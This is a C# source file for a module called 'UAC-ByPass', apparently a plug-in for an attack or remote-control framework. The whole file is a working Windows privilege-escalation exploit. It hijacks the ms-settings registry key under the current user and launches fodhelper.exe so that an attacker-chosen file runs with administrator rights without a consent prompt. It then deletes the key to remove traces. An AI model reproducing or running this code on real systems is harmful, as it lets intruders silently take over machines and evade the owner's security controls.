using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using ModuleBase;

namespace UACBypass
{
    public class UacBypass : Module
    {
        public override string Name => "UAC-ByPass";

        public override void InnerExecute(string parameters)
        {

            if (Environment.OSVersion.Version.Build < 9200)
            {
                this.Result.Result += "This UAC-ByPasss method requires NT 10.0 (Windows 10) or higher!";
                return;
            }

            string fileName = parameters;
            //Module.Log($"using {parameters} as file to run.");
            if (!File.Exists(fileName))
            {
                this.Result.Result += $"The filename {fileName} specified in the argument is not valid";
                return;
            }

            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!hasAdministrativeRight)
            {
                try
                {
                    RegistryKey rk;
                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\ms-settings\shell\open\command");
                    rk.SetValue("", fileName, RegistryValueKind.String);
                    rk.SetValue("DelegateExecute", "", RegistryValueKind.String);

                    this.AppendResult("Registry Key modified...", true);

                    Thread.Sleep(2000);

                    Process.Start(@"C:\Windows\System32\fodhelper.exe").WaitForExit();
                    rk.Close();

                    this.AppendResult("fodhelper started...", true);

                    rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                    rk.DeleteSubKeyTree("ms-settings");
                    rk.Close();

                    this.AppendResult("cleaning done.", true);
                }
                catch (Exception ex)
                {

                    RegistryKey rk = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes");
                    rk.DeleteSubKeyTree("ms-settings");
                    rk.Close();
                    this.AppendResult(ex.ToString());
                    Environment.Exit(-1);
                }
            }

            this.AppendResult($"UAC Bypassed and ran {fileName}!");
        }
    }
}
